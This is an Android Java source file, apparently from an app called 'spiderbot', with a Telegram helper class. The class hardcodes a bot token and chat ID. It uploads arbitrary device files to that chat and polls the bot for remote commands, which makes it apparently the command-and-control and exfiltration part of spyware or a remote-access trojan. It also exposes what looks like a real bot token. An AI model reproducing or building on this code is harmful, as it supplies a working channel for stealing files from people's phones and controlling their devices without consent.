package com.spiderbot;
import android.util.Log;
import org.json.JSONObject;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.concurrent.Executors;
public class TelegramAPI {
    public static String BOT_TOKEN = "8720722128:AAHbLoqGqIx9iPu6l4vGbOTInh-46o9am98";
    public static String CHAT_ID = "6793813126";
    private static int lastId = 0;
    public static void sendMessage(String text) {
        Executors.newSingleThreadExecutor().execute(() -> {
            try {
                HttpURLConnection conn = (HttpURLConnection) new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage").openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                conn.setRequestProperty("Content-Type", "application/json");
                JSONObject json = new JSONObject();
                json.put("chat_id", CHAT_ID);
                json.put("text", text);
                json.put("parse_mode", "HTML");
                conn.getOutputStream().write(json.toString().getBytes());
                conn.getResponseCode();
                conn.disconnect();
            } catch (Exception e) { Log.e("TG", "send error", e); }
        });
    }
    public static void sendFile(File file, String caption) {
        Executors.newSingleThreadExecutor().execute(() -> {
            try {
                String boundary = "*****";
                HttpURLConnection conn = (HttpURLConnection) new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendDocument").openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
                OutputStream os = conn.getOutputStream();
                os.write(("--" + boundary + "\r\n").getBytes());
                os.write(("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n" + CHAT_ID + "\r\n").getBytes());
                os.write(("--" + boundary + "\r\n").getBytes());
                os.write(("Content-Disposition: form-data; name=\"document\"; filename=\"" + file.getName() + "\"\r\n\r\n").getBytes());
                FileInputStream fis = new FileInputStream(file);
                byte[] b = new byte[4096];
                int len;
                while ((len = fis.read(b)) != -1) os.write(b, 0, len);
                fis.close();
                os.write(("\r\n--" + boundary + "--\r\n").getBytes());
                os.flush(); os.close();
                conn.getResponseCode();
                conn.disconnect();
            } catch (Exception e) { Log.e("TG", "file error", e); }
        });
    }
    public static void checkCommands(CommandCallback cb) {
        Executors.newSingleThreadExecutor().execute(() -> {
            try {
                HttpURLConnection conn = (HttpURLConnection) new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/getUpdates?offset=" + (lastId + 1) + "&timeout=10").openConnection();
                conn.setRequestMethod("GET");
                BufferedReader r = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                StringBuilder sb = new StringBuilder();
                String l;
                while ((l = r.readLine()) != null) sb.append(l);
                r.close();
                conn.disconnect();
                JSONObject json = new JSONObject(sb.toString());
                if (json.getBoolean("ok")) {
                    var res = json.getJSONArray("result");
                    for (int i = 0; i < res.length(); i++) {
                        JSONObject up = res.getJSONObject(i);
                        lastId = up.getInt("update_id");
                        if (up.has("message")) {
                            JSONObject msg = up.getJSONObject("message");
                            String chat = String.valueOf(msg.getJSONObject("chat").getLong("id"));
                            if (chat.equals(CHAT_ID) && msg.has("text"))
                                cb.onCommand(msg.getString("text"));
                        }
                    }
                }
            } catch (Exception e) { Log.e("TG", "poll error", e); }
        });
    }
    public interface CommandCallback { void onCommand(String cmd); }
}
